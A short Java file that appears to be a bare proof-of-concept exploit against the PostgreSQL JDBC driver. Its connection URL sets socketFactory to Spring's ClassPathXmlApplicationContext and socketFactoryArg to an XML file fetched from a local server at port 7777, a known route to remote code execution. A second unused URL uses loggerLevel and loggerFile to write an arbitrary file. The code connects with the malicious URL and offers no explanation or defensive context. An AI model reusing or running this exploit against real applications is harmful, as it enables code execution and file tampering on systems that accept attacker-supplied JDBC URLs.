package com.test;

import org.postgresql.Driver;

import java.sql.SQLException;

public class DirectConnect {
    public static void main(String[] args) throws SQLException {
        Driver driver = new Driver();
        String url = "jdbc:postgresql://127.0.0.1:1111/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:7777/1.xml";
        String url1 = "jdbc:postgresql://127.0.0.1:7777/test/";
        String url2 = "jdbc:postgresql://FileWrite/?loggerLevel=DEBUG&loggerFile=log.txt";
        driver.connect(url, null);
    }
}
